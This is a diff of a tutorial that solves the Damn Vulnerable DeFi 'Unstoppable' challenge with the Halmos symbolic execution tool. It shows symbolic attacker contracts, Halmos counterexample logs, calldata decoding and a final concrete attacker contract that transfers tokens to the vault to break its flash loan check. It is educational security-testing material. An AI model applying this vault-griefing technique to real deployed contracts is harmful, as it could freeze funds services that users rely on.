@@ -1,365 +1,333 @@
 # Halmos vs Unstoppable 
+## Halmos version
+**halmos 0.2.1.dev16+g1502e46** was used in this article
 ## Idea overview
 Let's imagine that we don't know how to solve this challenge. The only things we know are the code of contracts, pre-written "setUp()" function, final state we must achieve and the "test_unstoppable()" function, where we should write our solution.
 The idea is:
-1. Create some "AbstractAttacker" contract, controlled by player and give it all necessary resources  (DamnValuableToken supply).
-2. AbstractAttacker should be able to symbolically execute all known contracts with all possible parameters to find necessary state.
-3. In "_isSolved()" function write assert, opposite to existing one. That means, there is 
-```
-assertTrue(vault.paused(), "Vault is not paused");
-```
-assert, that expects to vault be paused. We'll change it to
-```
-assertFalse(vault.paused(), "Vault is not paused");
-```
-so Halmos will find counterexample where vault is not paused. This will be our solution for the challenge.
+1. Create some "SymbolicAttacker" contract, controlled by player and give it all necessary resources (DamnValuableToken supply).
 
-4. Paste this counterexample to initial code and execute forge test 
-5. Forge test should be passed
+2. SymbolicAttacker should be able to symbolically execute all known contracts with all possible parameters to find necessary state.
+
+3. In "_isSolved()" function, write an assert opposite to the existing one. That means, if there is:
+    ```javascript
+    assertTrue(*Some condition*);
+    ```
+    we will change it to:
+    ```javascript
+    assertFalse(*Some condition*);
+    ```
+    so Halmos will find a counterexample where this condition is true. This will be our solution for the challenge.
+
+4. Paste this counterexample into the initial code and execute **forge test**.
+
+5. **forge test** should be passed.
 ## Common prerequisites
 1. Copy Unstoppable.t.sol file to Unstoppable_Halmos.t.sol. All Halmos-related changes should be done here.
+
 2. Since Halmos doesn't support 
-```
-vm.expectEmit()
-```
-cheatcode, we simply delete this code.
+    ```
+    vm.expectEmit()
+    ```
+    cheatcode, we simply delete this code.
 
-3. Rename "test_unstoppable()" to "check_unstoppable()", so Halmos will execute this function symbolically.
+3. Rename **"test_unstoppable()"** to **"check_unstoppable()"**, so Halmos will execute this test symbolically.
 4. Since Halmos doesn't support the next cheatcode, it should be replaced:
-```
-vm.startPrank(player, player);
-```
-by
-```
-vm.startPrank(player);
-```
+    ```
+    vm.startPrank(player, player);
+    ```
+    by
+    ```
+    vm.startPrank(player);
+    ```
+5. We should avoid using the makeAddr() cheatcode, because Halmos treats such addresses as symbolic, leading to incorrect counterexamples. Simply put, Halmos can assume that the deployer and the player have the same addresses (is the same person), which destroys the very essence of the challenge. So we have to replace makeAddr() with specific hardcoded values:
+    ```javascript
+    address deployer = makeAddr("deployer");
+    address player = makeAddr("player");
+    ```
+    by
+    ```javascript
+    address deployer = address(0xcafe0000);
+    address player = address(0xcafe0001);
+    ```
+6. Halmos execution should be done without timeout assertion:
+    ```
+    halmos <...> --solver-timeout-assertion 0
+    ```
 
-5. Halmos execution should be done without timeout assertion:
-```
-halmos --solver-timeout-assertion 0
-```
 
-
-## Deploying AbstractAttacker contract
+## Deploying SymbolicAttacker contract
 So, let's write our "check_unstoppable()" function:
 ```javascript
 function  check_unstoppable() public  checkSolvedByPlayer {
-
-AbstractAttacker attacker =  new  AbstractAttacker(); // Deploy attacker contract
-token.transfer(address(attacker), INITIAL_PLAYER_TOKEN_BALANCE); // Transfer necessary resources to attacker
-attacker.attack(); // execute symbolic attack
+    SymbolicAttacker attacker =  new SymbolicAttacker(); // Deploy attacker contract
+    token.transfer(address(attacker), INITIAL_PLAYER_TOKEN_BALANCE); // Transfer necessary resources to attacker
+    attacker.attack(); // execute symbolic attack
 }
 ```
 Pretty simple so far.
-## AbstractAttacker implementation
-First of all, it should support symbolic execution and common forge cheatcodes so let's import the necessary stuff:
+## SymbolicAttacker implementation
+First of all, it should support symbolic execution and common forge cheatcodes. So let's import the necessary stuff:
 ```javascript
 // SPDX-License-Identifier: MIT
-pragma  solidity =0.8.25;
-import  "../../lib/halmos-cheatcodes/src/SymTest.sol";
-import  "forge-std/Test.sol";
+
+pragma solidity =0.8.25;
+
+import "../../lib/halmos-cheatcodes/src/SymTest.sol";
+import "forge-std/Test.sol";
 ```
-Let's implement our first "naive" contract implementation:
+
+Since the basis of our idea is the symbolic execution of some transaction, which, as we assume, leads to a bug, the implementation of the attacking function looks like this:
 ```javascript
-contract  AbstractAttacker  is  Test, SymTest {
-	function  attack() public {
-		address to_call = svm.createAddress('to_call'); // Generate symbolic address
-		bytes  memory data = svm.createBytes(100, 'data'); // Generate symbolic data
-		(bool success, ) = to_call.call(data); // execute symbolic function for symbolic 	address
-		if (!success) {
-			revert(); // attack function is guaranted to success
-		}
-	}
+contract SymbolicAttacker is Test, SymTest {
+	function attack() public {
+        address target = svm.createAddress("target");
+        bytes memory data = svm.createBytes(100, 'data');
+        target.call(data);
+    }
 }
 ```
-and try to execute it:
-```bash
-~halmos --solver-timeout-assertion 0
-...
-[ERROR] check_unstoppable() (paths: 3, time: 0.39s, bounds: [])
-WARNING:halmos:Encountered Unknown contract call: to = halmos_to_call_address_01(); calldata = halmos_data_bytes_02(); callvalue = 0x0000000000000000000000000000000000000000000000000000000000000000
-(see https://github.com/a16z/halmos/wiki/warnings#internal-error)
-Symbolic test result: 0 passed; 1 failed; time: 0.93s
-```
-Oops, we got an "Encountered Unknown contract call" error. Therefore, we can't use symbolic address as a call address. The solution is to have some list of "known" contracts and brootforce symbolic calls to them:
-```javascript
-contract  AbstractAttacker  is  Test, SymTest {
+Let's break down the attack() function line by line:
+1. Since we don't know which contract call is causing the bug, we work with target as some symbolic address
+    ```javascript
+    address target = svm.createAddress("target");
+    ```
+2. The situation is similar here - we do not know which function of the contract and with which parameters it should be called to trigger the bug, so we work with calldata as with symbolic values.
+    ```javascript
+    bytes memory data = svm.createBytes(100, 'data');
+    ```
+3. Finally, we got to the place where all the magic happens:
+If you make a call to the symbolic address, Halmos will automatically process all known contracts by brute force. In this case, these are **DamnValuableToken**, **UnstoppableVault**, **UnstoppableMonitor** and, unexpectedly, **SymbolicAttacker** himself (we'll come back to this later). 
+    Accordingly, the symbolic calldata **data** will also be bruteforced as all possible entry points of contracts with corresponding symbolic parameters.
+    ```javascript
+    target.call(data);
+    ```
 
-	mapping (uint256  =>  address) known_addresses;
-	uint256 known_next_index =  0;
-
-	function  add_known_address(address  known) public {
-		known_addresses[known_next_index] = known;
-		known_next_index++;
-	}
-	function  attack() public {
-		uint256 contract_index = svm.createUint256('contract_index');
-		vm.assume(contract_index < known_next_index);
-		for (uint256 i =  0; i < known_next_index; i++) { // brootforce is happening here
-			if (i == contract_index) {
-				address to_call = known_addresses[i]; // contract address is not symbolic now
-				bytes  memory data = svm.createBytes(100, 'data');
-				(bool success, ) = to_call.call(data);
-				if (!success) {
-					revert(); // attack function is guaranted to success
-				}
-			}
-		}
-	}
-}
-```
-and add some known addresses:
-```javascript
-function  check_unstoppable() public  checkSolvedByPlayer {
-
-AbstractAttacker attacker =  new  AbstractAttacker(); // Deploy attacker contract
-token.transfer(address(attacker), INITIAL_PLAYER_TOKEN_BALANCE); // Transfer necessary resources to attacker
-attacker.add_known_address(address(token));
-attacker.add_known_address(address(vault));
-attacker.add_known_address(address(monitorContract));
-attacker.attack(); // execute symbolic attack
-}
-```
-Now, Halmos can symbolically execute calls to different contracts:
-```bash
-Running 1 tests for test/unstoppable/Unstoppable_Halmos.t.sol:UnstoppableChallenge
-Counterexample: 
-    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000000 (0)
-    halmos_data_bytes_02 = 0xdd62ed3e000000000000000000000000000000000000000000000000000400000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
-Counterexample: 
-    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000000 (0)
-    halmos_data_bytes_02 = 0xdd62ed3e000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
-...
-```
-We'll ignore them for now.
 ## _isSolved() implementation and counterexample
-This function is check function, that is executing just after "check_unstoppable()". Attacker finished it's work, so it's time to check state and generate counterexample:
+This function is a check function that is executed immediately after “check_unstoppable()”. The attacker has finished it's work, so it's time to check the state and create a counterexample.
+The original checks look like:
 ```javascript
 function  _isSolved() private {
-	vm.prank(deployer);
-	monitorContract.checkFlashLoan(100e18);
-	// Halmos should generate counterexample here.
-	// We expect it to find such a contract and data that sets the vault paused.
-	assertFalse(vault.paused(), "Vault is not paused"); 
+    ...
+    // And now the monitor paused the vault and transferred ownership to deployer
+    assertTrue(vault.paused(), "Vault is not paused");
+    assertEq(vault.owner(), deployer, "Vault did not change owner");
 }
 ```
-Execute it:
+Then the opposite check will look like this:
 ```javascript
-halmos --solver-timeout-assertion 0
+function  _isSolved() private {
+    ...
+    assert(vault.paused() == false || vault.owner() != deployer);
+}
+```
+Finally, execute it:
+```javascript
+~$ halmos --function check_unstoppable --solver-timeout-assertion 0
 ...
 Running 1 tests for test/unstoppable/Unstoppable_Halmos.t.sol:UnstoppableChallenge
-Counterexample: 
-    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000000 (0)
-    halmos_data_bytes_02 = 0x95d89b41000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
-Counterexample: 
-    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000000 (0)
-    halmos_data_bytes_02 = 0xdd62ed3e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
-Counterexample: 
-    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000000 (0)
-    halmos_data_bytes_02 = 0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa0003fffffffffffffffffffefffffeffffffffe8d7e77ffcc7a964067301b6749db00000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
-Counterexample: 
-    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000000 (0)
-    halmos_data_bytes_02 = 0x7ecebe00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
-Counterexample: 
-    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000000 (0)
-    halmos_data_bytes_02 = 0x3644e515000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
-Counterexample: 
-    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000000 (0)
-    halmos_data_bytes_02 = 0x70a08231000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
-Counterexample: 
-    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000000 (0)
-    halmos_data_bytes_02 = 0x313ce567000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
-Counterexample: 
-    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000000 (0)
-    halmos_data_bytes_02 = 0x18160ddd000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
-Counterexample: 
-    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000000 (0)
-    halmos_data_bytes_02 = 0x06fdde03000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
-Counterexample: 
-    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000001 (1)
-    halmos_data_bytes_02 = 0xefbe1c1c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
-Counterexample: 
-    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000000 (0)
-    halmos_data_bytes_02 = 0x23b872dd000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
-Counterexample: 
-    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000000 (0)
-    halmos_data_bytes_02 = 0x095ea7b3000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
-Counterexample: 
-    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000001 (1)
-    halmos_data_bytes_02 = 0xdd62ed3e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
-Counterexample: 
-    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000001 (1)
-    halmos_data_bytes_02 = 0xd9d98ce400000000000000000000000000000000000000000000000000000000aaaa0002000000000000000000000000000000000000000000007fff759c0d04380000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
-Counterexample: 
-    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000001 (1)
-    halmos_data_bytes_02 = 0xd905777e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
-Counterexample: 
-    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000001 (1)
-    halmos_data_bytes_02 = 0xc63d75b6000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
-Counterexample: 
-    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000001 (1)
-    halmos_data_bytes_02 = 0xc1a287e2000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
-Counterexample: 
-    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000001 (1)
-    halmos_data_bytes_02 = 0xef8b30f7000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
-Counterexample: 
-    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000001 (1)
-    halmos_data_bytes_02 = 0xc6e6f592000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
-Counterexample: 
-    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000001 (1)
-    halmos_data_bytes_02 = 0xb460af94000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000aaaa00030000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
-Counterexample: 
-    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000001 (1)
-    halmos_data_bytes_02 = 0xba08765200000000000000000000000000000000000000000000d3c21bcecceda1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000aaaa0005 (100 bytes)
-Counterexample: 
-    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000001 (1)
-    halmos_data_bytes_02 = 0xce96cb77000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
-    ....
+Counterexample:
+Running 1 tests for test/unstoppable/Unstoppable_Halmos.t.sol:UnstoppableChallenge
+WARNING:halmos:Counterexample (potentially invalid):
+halmos_data_bytes_2658b5c_02 = 0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa0003000000000000000000000000000000000000000000000000743133125f0000010000000000000000000000000000000000000000000000000000000000000000
+halmos_target_address_dc9e083_01 = 0x00000000000000000000000000000000aaaa0002
+(see https://github.com/a16z/halmos/wiki/warnings#counterexample-invalid)
+WARNING:halmos:Counterexample (potentially invalid):
+halmos_data_bytes_2658b5c_02 = 0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa0003000000000000000000000000000000000000000000000000743133125f0000010000000000000000000000000000000000000000000000000000000000000000
+halmos_target_address_dc9e083_01 = 0x00000000000000000000000000000000aaaa0002
+(see https://github.com/a16z/halmos/wiki/warnings#counterexample-invalid)
+WARNING:halmos:Counterexample (potentially invalid):
+halmos_data_bytes_2658b5c_02 = 0x9e5faafc000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+halmos_data_bytes_8a799d8_04 = 0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa00030000000000000000000000000000000000000000000000007f3ffce4e8f1c0000000000000000000000000000000000000000000000000000000000000000000
+halmos_target_address_cc8b1e9_03 = 0x00000000000000000000000000000000aaaa0002
+halmos_target_address_dc9e083_01 = 0x00000000000000000000000000000000aaaa0005
+(see https://github.com/a16z/halmos/wiki/warnings#counterexample-invalid)
+WARNING:halmos:Counterexample (potentially invalid):
+halmos_data_bytes_2658b5c_02 = 0x9e5faafc000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+halmos_data_bytes_8a799d8_04 = 0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa00030000000000000000000000000000000000000000000000007f3ffce4e8f1c0000000000000000000000000000000000000000000000000000000000000000000
+halmos_target_address_cc8b1e9_03 = 0x00000000000000000000000000000000aaaa0002
+halmos_target_address_dc9e083_01 = 0x00000000000000000000000000000000aaaa0005
+(see https://github.com/a16z/halmos/wiki/warnings#counterexample-invalid)
+WARNING:halmos:Counterexample (potentially invalid):
+halmos_data_bytes_2658b5c_02 = 0x9e5faafc000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+halmos_data_bytes_8a799d8_04 = 0x9e5faafc000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+halmos_data_bytes_9d914dc_06 = 0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa0003000000000000000000000000000000000000000000000000804013125f0000000000000000000000000000000000000000000000000000000000000000000000
+halmos_target_address_cc8b1e9_03 = 0x00000000000000000000000000000000aaaa0005
+halmos_target_address_d348a8b_05 = 0x00000000000000000000000000000000aaaa0002
+halmos_target_address_dc9e083_01 = 0x00000000000000000000000000000000aaaa0005
+(see https://github.com/a16z/halmos/wiki/warnings#counterexample-invalid)
+WARNING:halmos:Counterexample (potentially invalid):
+halmos_data_bytes_2658b5c_02 = 0x9e5faafc000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+halmos_data_bytes_8a799d8_04 = 0x9e5faafc000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+halmos_data_bytes_9d914dc_06 = 0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa0003000000000000000000000000000000000000000000000000804013125f0000000000000000000000000000000000000000000000000000000000000000000000
+halmos_target_address_cc8b1e9_03 = 0x00000000000000000000000000000000aaaa0005
+halmos_target_address_d348a8b_05 = 0x00000000000000000000000000000000aaaa0002
+halmos_target_address_dc9e083_01 = 0x00000000000000000000000000000000aaaa0005
+(see https://github.com/a16z/halmos/wiki/warnings#counterexample-invalid)
+....
 ```
-A lot of TRASH counterexamples, that obviously just random calls to random contracts. These calls do not lead to flashloan error. Actually, I don't know where did they come from :).
-But, fortunately, I accidentally found the solution for this problem! I added some random public variable read in the start of "_isSolved()":
+Hooray! We received a number of very similar counterexamples. They appear one after another, so I had to stop the analysis process at some point. Let's analyze what happened here.
+## Counterexamples analysis
+### Dealing with multiple counterexamples
+First of all, let's add logging to the beginning of the test execution. Let's look at the addresses of each of the deployed contracts:
 ```javascript
-function  _isSolved() private {
-	vm.prank(deployer);
-	address feeRecipientGot = vault.feeRecipient(); // Public variable reading
-	monitorContract.checkFlashLoan(100e18);
-	assertFalse(vault.paused(), "Vault is not paused"); // Counterexample here
-}
+function check_unstoppable() public  checkSolvedByPlayer {
+        SymbolicAttacker attacker =  new SymbolicAttacker(); // Deploy attacker contract
+        console.log("token\t", address(token));
+        console.log("vault\t", address(vault));
+        console.log("monitor\t", address(monitorContract));
+        console.log("attacker\t", address(attacker));
+        ...
 ```
-Execute again:
-```bash
-halmos --solver-timeout-assertion 0
+And run again:
+```javascript
+~$ halmos --function check_unstoppable --solver-timeout-assertion 0
 ...
-Counterexample: 
-    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000000 (0)
-    halmos_data_bytes_02 = 0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa000300000000000000000000000000000000000000000000000003c723168ff988000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
-...
+Running 1 tests for test/unstoppable/Unstoppable_Halmos.t.sol:UnstoppableChallenge
+[console.log] token      0x00000000000000000000000000000000000000000000000000000000aaaa0002
+[console.log] vault      0x00000000000000000000000000000000000000000000000000000000aaaa0003
+[console.log] monitor    0x00000000000000000000000000000000000000000000000000000000aaaa0004
+[console.log] attacker   0x00000000000000000000000000000000000000000000000000000000aaaa0005         
 ```
-SPOILER: this is exactly what we are searching for!
+Now we have address information. Let's briefly look at the first 2 counterexamples (they are identical):
+```javascript
+halmos_data_bytes_2658b5c_02 = 0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa0003000000000000000000000000000000000000000000000000743133125f0000010000000000000000000000000000000000000000000000000000000000000000
+halmos_target_address_dc9e083_01 = 0x00000000000000000000000000000000aaaa0002    
+```
+Here the attacker executed some transaction on the token contract, which led to the bug. Before studying it in more depth, it is necessary to consider other counterexamples:
+```javascript
+halmos_data_bytes_2658b5c_02 = 0x9e5faafc000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+halmos_data_bytes_8a799d8_04 = 0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa00030000000000000000000000000000000000000000000000007f3ffce4e8f1c0000000000000000000000000000000000000000000000000000000000000000000
+halmos_target_address_cc8b1e9_03 = 0x00000000000000000000000000000000aaaa0002
+halmos_target_address_dc9e083_01 = 0x00000000000000000000000000000000aaaa0005  
+```
+and
+```javascript
+halmos_data_bytes_2658b5c_02 = 0x9e5faafc000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+halmos_data_bytes_8a799d8_04 = 0x9e5faafc000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+halmos_data_bytes_9d914dc_06 =
+0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa0003000000000000000000000000000000000000000000000000804013125f0000000000000000000000000000000000000000000000000000000000000000000000
+halmos_target_address_cc8b1e9_03 = 0x00000000000000000000000000000000aaaa0005
+halmos_target_address_d348a8b_05 = 0x00000000000000000000000000000000aaaa0002
+halmos_target_address_dc9e083_01 = 0x00000000000000000000000000000000aaaa0005
+```
+Given that we already know that **0x0...aaaa0005** is the attacker's address, it is easy to guess that we are dealing with recursion. attacker calls its own attack() function and thus inflates the analysis with garbage counterexamples. Fixing this is quite simple - just use the vm.assume() cheat code when creating a symbolic address:
+```javascript
+function attack() public {
+        address target = svm.createAddress("target");
+        vm.assume (target != address(this)); // Avoid recursion
+        ...
+```
+Now we've gotten rid of the trashy recursive counterexamples and have only meaningful one.
 
-Let's break down this output:
-```bash
-halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000000 (0)
+### Calldata analysis
+
+We already know that the attack is based on some transaction to the token address. Let's break down this calldata brick by brick:
+```javascript
+0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa0003000000000000000000000000000000000000000000000000743133125f0000010000000000000000000000000000000000000000000000000000000000000000
 ```
-means that this is the 0th contract from known contracts list (DamnValuableToken contract)
-```bash
-halmos_data_bytes_02 = 0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa000300000000000000000000000000000000000000000000000003c723168ff988000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
+The first 4 bytes (a9059cbb) are the selector of some token function. It is easy to find out which selector it is. It is enough to look at the compiler artifacts in the file **out/DamnValuableToken.sol/DamnValuableToken.json** and enter this selector in the search:
+```json
+...,"transfer(address,uint256)":"a9059cbb",...
 ```
-is more interesting. First 4 bytes "a9059cbb" are token "transfer" selector
-Next bytes 
-```bash
+This is just a transfer function.
+The parameters of this function are also simple:
+```javascript
 00000000000000000000000000000000000000000000000000000000aaaa0003
 ```
-are some address. This is tokens receiver address. We'll find out what address is it later.
-And the third part 
-```bash
-00000000000000000000000000000000000000000000000003c723168ff988000000000000000000000000000000000000000000000000000000000000000000
-```
-is amount of tokens to transfer. 0s in the end is padding. Since we generated 100 symbolic bytes, it generates 0s padding. We can leave it as is.
-Now, it is necessary to find out what the address is our "receiver". We'll use console logging functional from forge and print all contracts addresses in "setUp()" function:
+Obviously, this is the address of the vault contract.
+The remaining bytes are the amount that we pass to the transfer function:
 ```javascript
-// SPDX-License-Identifier: MIT
-// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
-pragma  solidity =0.8.25;
-import {Test, console} from  "forge-std/Test.sol";
-import {DamnValuableToken} from  "../../src/DamnValuableToken.sol";
-import {UnstoppableVault, Owned} from  "../../src/unstoppable/UnstoppableVault.sol";
-import {UnstoppableMonitor} from  "../../src/unstoppable/UnstoppableMonitor.sol";
-import  "./AbstractAttacker.sol";
-import  "forge-std/console.sol";
-...
-function  setUp() public {
-...
-	console.logAddress(address(token));
-	console.logAddress(address(vault));
-	console.logAddress(address(monitorContract));
-
-	vm.stopPrank();
-}
+000000000000000000000000000000000000000000000000743133125f0000010000000000000000000000000000000000000000000000000000000000000000
 ```
-Execute:
-```bash
-halmos --solver-timeout-assertion 0
-...
-Running 1 tests for test/unstoppable/Unstoppable_Halmos.t.sol:UnstoppableChallenge
-[console.log] 0x00000000000000000000000000000000000000000000000000000000aaaa0002
-[console.log] 0x00000000000000000000000000000000000000000000000000000000aaaa0003
-[console.log] 0x00000000000000000000000000000000000000000000000000000000aaaa0004
-Counterexample: 
-    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000000 (0)
-    halmos_data_bytes_02 = 0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa000300000000000000000000000000000000000000000000000003c723168ff988000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
-```
-So, it was "vault" contract. Attacker sends some tokens to vault contract and it should lead to flashloan error.
+0s in the end is padding. Since we generated 100 symbolic bytes, it generates 0s padding. We can leave it as is.
+As a result, we clarified everything: Attacker sends some tokens to vault contract and it should lead to flashloan error.
 ## Using of counterexample 
-First of all, let's find "vault" contract address in forge. We'll use the same console logging here and this is what we got:
-```bash
-forge test -vv --mp test/unstoppable/Unstoppable.t.sol
+First of all, let's find all contract addresses in **forge**. We'll use the same console logging here and this is what we got:
+```javascript
+~$ forge test -vv --mp test/unstoppable/Unstoppable.t.sol
 ...
 Logs:
-  0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b
-  0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264 // This is vault address in forge
-  0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5
+token          0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b
+vault          0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264
+monitor        0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5
   ...
 ```
-Implement non-abstract attacker contract:
+Implement non-symbolic attacker contract:
 ```javascript
-// SPDX-License-Identifier: MIT
-pragma  solidity =0.8.25;
-import  "../../lib/halmos-cheatcodes/src/SymTest.sol";
-import  "forge-std/Test.sol";
-contract  AbstractAttacker  is  Test, SymTest {
-	mapping (uint256  =>  address) known_addresses;
-	uint256 known_next_index =  0;
-	
-	function  add_known_address(address  known) public {
-		known_addresses[known_next_index] = known;
-		known_next_index++;
-	}
-	function  attack() public {
-		uint256 contract_index =  0x0000000000000000000000000000000000000000000000000000000000000000; // Contract index is not symbolic, just paste value from counterexample
-		for (uint256 i =  0; i < known_next_index; i++) {
-			if (i == contract_index) {
-				address to_call = known_addresses[i];
-				// Paste hex from counterxample here, but replace receiver address with the correct one
-				bytes  memory data = hex"a9059cbb0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b26400000000000000000000000000000000000000000000000003c723168ff988000000000000000000000000000000000000000000000000000000000000000000";
-				(bool success, ) = to_call.call(data);
-				if (!success) {
-					revert();
-				}
-			}
-		}
-	}
+
+pragma solidity =0.8.25;
+
+import "../../lib/halmos-cheatcodes/src/SymTest.sol";
+import "forge-std/Test.sol";
+
+contract Attacker is Test, SymTest {
+	function attack() public {
+        address target = address(0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b);
+        bytes memory data = hex"a9059cbb0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b264000000000000000000000000000000000000000000000000743133125f0000010000000000000000000000000000000000000000000000000000000000000000";
+        target.call(data);
+    }
 }
 ```
-This is an exact copy of AbstractAttacker, except we've replaced the symbolic values ​​with concrete values ​​from the counterexample.
